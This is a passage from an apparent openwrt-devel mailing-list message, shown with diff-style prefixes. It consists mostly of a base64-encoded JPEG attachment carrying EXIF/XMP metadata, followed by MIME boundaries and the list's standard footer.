+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAMjAyMDowNjoxNiAwNToyMjozMgAyMDIwOjA2OjE2IDA1OjIy
+OjMyAAAASgBFAFMASwBZAAAA/+ELGGh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94
+cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4NCjx4
+OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iPjxyZGY6UkRGIHhtbG5zOnJkZj0i
+aHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpEZXNj
+cmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1
+MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iLz48
+cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0idXVpZDpmYWY1YmRkNS1iYTNkLTExZGEtYWQz
+MS1kMzNkNzUxODJmMWIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4w
+LyI+PHhtcDpDcmVhdGVEYXRlPjIwMjAtMDYtMTZUMDU6MjI6MzIuMDEyPC94bXA6Q3JlYXRl
+RGF0ZT48L3JkZjpEZXNjcmlwdGlvbj48cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0idXVp
+ZDpmYWY1YmRkNS1iYTNkLTExZGEtYWQzMS1kMzNkNzUxODJmMWIiIHhtbG5zOmRjPSJodHRw
+Oi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+PGRjOmNyZWF0b3I+PHJkZjpTZXEgeG1s
+bnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj48
+cmRmOmxpPkpFU0tZPC9yZGY6bGk+PC9yZGY6U2VxPg0KCQkJPC9kYzpjcmVhdG9yPjwvcmRm
+OkRlc2NyaXB0aW9uPjwvcmRmOlJERj48L3g6eG1wbWV0YT4NCiAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD94cGFja2V0IGVuZD0ndyc/Pv/b
+AEMABwUFBgUEBwYFBggHBwgKEQsKCQkKFQ8QDBEYFRoZGBUYFxseJyEbHSUdFxgiLiIlKCkr
+LCsaIC8zLyoyJyorKv/bAEMBBwgICgkKFAsLFCocGBwqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKv/AABEIAEwAPAMBIgACEQEDEQH/xAAfAAAB
+BQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEF
+EiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVG
+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
+
+
+------=_NextPart_000_0012_31A71817.0EB2A91B--
+
+
+
+--===============0967337869878152308==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 openwrt-devel mailing list
 openwrt-devel@lists.openwrt.org
 https://lists.openwrt.org/mailman/listinfo/openwrt-devel
+
+--===============0967337869878152308==--
+
+
